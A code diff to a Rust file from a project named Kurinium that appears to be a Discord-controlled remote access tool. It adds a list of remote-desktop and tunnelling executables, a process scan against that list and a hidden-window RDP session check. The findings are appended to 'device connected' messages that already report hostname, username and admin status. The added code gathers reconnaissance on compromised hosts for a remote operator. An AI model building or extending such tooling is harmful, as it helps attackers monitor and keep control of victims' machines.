@@ -1,9 +1,63 @@
 use anyhow::{anyhow, Result};
 use serde::{Deserialize, Serialize};
 use std::path::Path;
-use sysinfo::{CpuExt, DiskExt, System, SystemExt};
+use sysinfo::{CpuExt, DiskExt, System, SystemExt, ProcessExt, PidExt};
 
 const PROJECT_FOOTER: &str = "-# Kurinium: https://github.com/Mikasuru/Kurinium";
+
+// Remote Desktop Applications to detect
+const REMOTE_DESKTOP_APPS: &[(&str, &str)] = &[
+    // Remote Access Tools
+    ("anydesk.exe",                     "AnyDesk"),
+    ("teamviewer.exe",                  "TeamViewer"),
+    ("teamviewer_service.exe",          "TeamViewer Service"),
+    ("tv_w32.exe",                      "TeamViewer"),
+    ("tv_x64.exe",                      "TeamViewer"),
+    ("rustdesk.exe",                    "RustDesk"),
+    ("supremo.exe",                     "Supremo"),
+    ("supremoservice.exe",              "Supremo Service"),
+    ("ammyy_admin.exe",                 "Ammyy Admin"),
+    ("aa_v3.exe",                       "Ammyy Admin"),
+    ("radmin.exe",                      "Radmin"),
+    ("rserver3.exe",                    "Radmin Server"),
+    ("uvnc_service.exe",                "UltraVNC"),
+    ("winvnc.exe",                      "UltraVNC"),
+    ("vncviewer.exe",                   "VNC Viewer"),
+    ("tvnserver.exe",                   "TightVNC"),
+    ("tvnviewer.exe",                   "TightVNC Viewer"),
+    ("screenconnect.clientservice.exe", "ScreenConnect"),
+    ("screenconnect.windowsclient.exe", "ScreenConnect"),
+    ("connectwisecontrol.client.exe",   "ConnectWise Control"),
+    ("bomgar-scc.exe",                  "Bomgar/BeyondTrust"),
+    ("splashtop.exe",                   "Splashtop"),
+    ("strwinclt.exe",                   "Splashtop Streamer"),
+    ("srservice.exe",                   "Splashtop Service"),
+    ("logmein.exe",                     "LogMeIn"),
+    ("lmiguardiansvc.exe",              "LogMeIn"),
+    ("remotepc.exe",                    "RemotePC"),
+    ("remotepchostuisvc.exe",           "RemotePC Service"),
+    ("dwservice.exe",                   "DWService"),
+    ("dwagent.exe",                     "DWAgent"),
+    ("parsec.exe",                      "Parsec"),
+    ("parsecd.exe",                     "Parsec Daemon"),
+    ("nomachine.exe",                   "NoMachine"),
+    ("nxd.exe",                         "NoMachine Daemon"),
+    ("chrome_remote_desktop.exe",       "Chrome Remote Desktop"),
+    ("remoting_host.exe",               "Chrome Remote Desktop"),
+    
+    // Windows Built-in
+    ("mstsc.exe",                       "Remote Desktop Client"),
+    ("msra.exe",                        "Remote Assistance"),
+    ("termsrv.exe",                     "Remote Desktop Services"),
+    
+    // Other Tools
+    ("ngrok.exe",                       "Ngrok"),
+    ("cloudflared.exe",                 "Cloudflare Tunnel"),
+    ("tailscale.exe",                   "Tailscale"),
+    ("zerotier-one.exe",                "ZeroTier"),
+    ("hamachi-2.exe",                   "Hamachi"),
+    ("hamachi-2-ui.exe",                "Hamachi UI"),
+];
 
 fn format_uptime(seconds: u64) -> String {
     let mut remaining = seconds;
@@ -98,9 +152,75 @@ fn windows_version_display() -> Option<String> {
     }
 }
 
-#[cfg(not(target_os = "windows"))]
-fn windows_version_display() -> Option<String> {
-    None
+// Remote Desktop Detection
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct RemoteConnection {
+    pub name: String,
+    pub display_name: String,
+    pub pid: u32,
+}
+
+pub fn detect_remote_connections() -> Vec<RemoteConnection> {
+    let mut connections = Vec::new();
+    let mut sys = System::new_all();
+    sys.refresh_processes();
+
+    for (pid, process) in sys.processes() {
+        let proc_name = process.name().to_lowercase();
+        for (exe_name, display_name) in REMOTE_DESKTOP_APPS {
+            if proc_name == *exe_name {
+                connections.push(RemoteConnection {
+                    name: process.name().to_string(),
+                    display_name: display_name.to_string(),
+                    pid: pid.as_u32(),
+                });
+                break;
+            }
+        }
+    }
+
+    connections.sort_by(|a, b| a.display_name.cmp(&b.display_name));
+    connections.dedup_by(|a, b| a.display_name == b.display_name && a.name == b.name);
+    connections
+}
+
+fn format_remote_connections(connections: &[RemoteConnection]) -> String {
+    if connections.is_empty() {
+        return "```\nNo remote desktop applications detected\n```".to_string();
+    }
+
+    let mut lines = Vec::new();
+    for conn in connections {
+        lines.push(format!("{:<30} | PID: {}", conn.display_name, conn.pid));
+    }
+
+    format!("```\n{}\n```", lines.join("\n"))
+}
+
+fn check_rdp_session() -> Option<String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let output = Command::new("query")
+        .args(["session"])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
+        .output()
+        .ok()?;
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    
+    let mut rdp_sessions = Vec::new();
+    for line in stdout.lines() {
+        if line.contains("rdp-tcp") && line.contains("Active") {
+            rdp_sessions.push(line.trim().to_string());
+        }
+    }
+
+    if rdp_sessions.is_empty() {
+        None
+    } else {
+        Some(rdp_sessions.join("\n"))
+    }
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -181,17 +301,19 @@ impl SystemInfo {
 
     pub fn format_reconnection(&self, device: &DeviceInfo) -> String {
         let details = self.render_details(device);
+        let connections = self.render_connections();
         format!(
-            "# Device **{}** reconnected\n{}\n{}",
-            device.username, details, PROJECT_FOOTER
+            "# Device **{}** reconnected\n{}\n{}\n{}",
+            device.username, details, connections, PROJECT_FOOTER
         )
     }
 
     pub fn format_for_discord(&self, device: &DeviceInfo) -> String {
         let details = self.render_details(device);
+        let connections = self.render_connections();
         format!(
-            "# Device **{}** is now connected\n{}\n{}",
-            device.username, details, PROJECT_FOOTER
+            "# Device **{}** is now connected\n{}\n{}\n{}",
+            device.username, details, connections, PROJECT_FOOTER
         )
     }
 
@@ -212,7 +334,7 @@ impl SystemInfo {
         let elevated = if device.admin_status { "Yes" } else { "No" };
 
         format!(
-            r#"**System Information:**
+            r#"### System Information:
 ```
 Hostname:      {}
 Username:      {}
@@ -241,6 +363,31 @@ Elevated:      {}
             current_dir,
             elevated
         )
+    }
+
+    fn render_connections(&self) -> String {
+        let remote_apps = detect_remote_connections();
+        let rdp_session = check_rdp_session();
+
+        let mut sections = Vec::new();
+        if !remote_apps.is_empty() {
+            let apps_text = remote_apps
+                .iter()
+                .map(|c| format!("{:<30} | PID: {}", c.display_name, c.pid))
+                .collect::<Vec<_>>()
+                .join("\n");
+            sections.push(format!("```\n{}\n```", apps_text));
+        }
+
+        if let Some(rdp) = rdp_session {
+            sections.push(format!("**Active RDP Session:**\n```\n{}\n```", rdp));
+        }
+
+        if sections.is_empty() {
+            "### Connections:\n```\nNo remote desktop applications detected\n```".to_string()
+        } else {
+            format!("### Connections:\n{}", sections.join("\n"))
+        }
     }
 }
 
